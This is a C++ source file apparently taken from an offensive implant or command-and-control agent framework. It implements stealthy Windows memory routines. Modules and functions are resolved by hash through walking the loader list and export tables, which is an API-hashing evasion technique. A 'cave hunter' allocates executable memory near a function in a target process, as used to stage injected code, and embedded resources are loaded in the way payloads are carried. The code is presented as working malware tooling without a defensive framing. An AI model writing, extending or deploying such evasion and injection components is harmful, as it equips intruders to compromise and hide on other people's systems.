#include <core/include/memory.hpp>

namespace Memory {
    HMODULE LdrGetModuleAddress(ULONG Hash) {

        HMODULE Base = {};
        WCHAR wcsName[MAX_PATH];

        auto Head = IN_MEMORY_ORDER_MODULE_LIST;
        auto Next = Head->Flink;

        while (Next != Head) {
            auto Mod = MODULE_ENTRY(Next);
            auto Name = MODULE_NAME(Mod);

            for (auto i = 0; i < x_wcslen(Name); i ++) {
                wcsName[i] = x_toLowerW(Name[i]);
            }

            if (Name) {
                if (Hash - Utils::GetHashFromStringW(wcsName, x_wcslen(wcsName)) == 0) {
                    Base = (HMODULE)Mod->BaseAddress;
                }
            }
            Next = Next->Flink;
        }
        return Base;
    }

    FARPROC LdrGetSymbolAddress(HMODULE Base, ULONG Hash) {

        FARPROC Export = {};
        CHAR mbsName[MAX_PATH];

        if (!Base) {
            return nullptr;
        }

        auto DosHead = IMAGE_DOS_HEADER(Base);
        auto NtHead = IMAGE_NT_HEADERS(Base, DosHead);
        auto Exports = IMAGE_EXPORT_DIRECTORY(DosHead, NtHead);

        if (Exports->AddressOfNames) {
            auto Ords = RVA(PWORD, Base, (long) Exports->AddressOfNameOrdinals);
            auto Fns = RVA(PULONG, Base, (long) Exports->AddressOfFunctions);
            auto Names = RVA(PULONG, Base, (long) Exports->AddressOfNames);

            for (ULONG i = 0; i < Exports->NumberOfNames; i++) {
                auto Name = RVA(LPSTR, Base, (long) Names[i]);

                for (auto i = 0; i < x_strlen(Name); i++) {
                   mbsName[i] = x_toLowerA(Name[i]);
                }

                if (Hash - Utils::GetHashFromStringA(mbsName, x_strlen(Name)) == 0) {
                    Export = (FARPROC)RVA(PULONG, Base, (long) Fns[Ords[i]]);
                }
            }
        }
        return Export;
    }

    UINT_PTR MmCaveHunter(HANDLE Proc, UINT_PTR Export, SIZE_T Size) {

        HEXANE
        UINT_PTR Region = 0;

        for (Region = (Export & 0xFFFFFFFFFFF70000) - 0x70000000;
            Region < Export + 0x70000000;
            Region += 0x10000) {

            if ((Ctx->Nt.NtAllocateVirtualMemory(Proc, C_PPTR(&Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
                return Region;
            }
        }

        return 0;
    }

    UINT_PTR LdrGetExport(PBYTE Module, PBYTE Export) {

        HEXANE
        UINT_PTR pExport = 0;
        INT reload = 0;

        while (!pExport) {
            if (!(FPTR2(pExport,
                Utils::GetHashFromStringA((LPSTR)Module, x_strlen((LPSTR)Module)),
                Utils::GetHashFromStringA((LPSTR)Export, x_strlen((LPSTR)Export))))) {
                if (reload ||
                    !(Ctx->win32.LoadLibraryA((LPCSTR)Module))) {
                    goto defer;
                }
                reload++;
            }
        }

    defer:
        return pExport;
    }

    ORSRC LdrGetIntResource(HMODULE Base, INT RsrcId) {

        HEXANE
        HRSRC hResInfo  = { };
        ORSRC Object    = { };

        Object = (ORSRC)Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC));

        if (
            !(hResInfo          = Ctx->win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
            !(Object->hGlobal   = Ctx->win32.LoadResource(Base, hResInfo)) ||
            !(Object->Size      = Ctx->win32.SizeofResource(Base, hResInfo)) ||
            !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
            Ctx->Nt.RtlFreeHeap(LocalHeap, 0, Object);
            return nullptr;
        }

        return Object;
    }
}
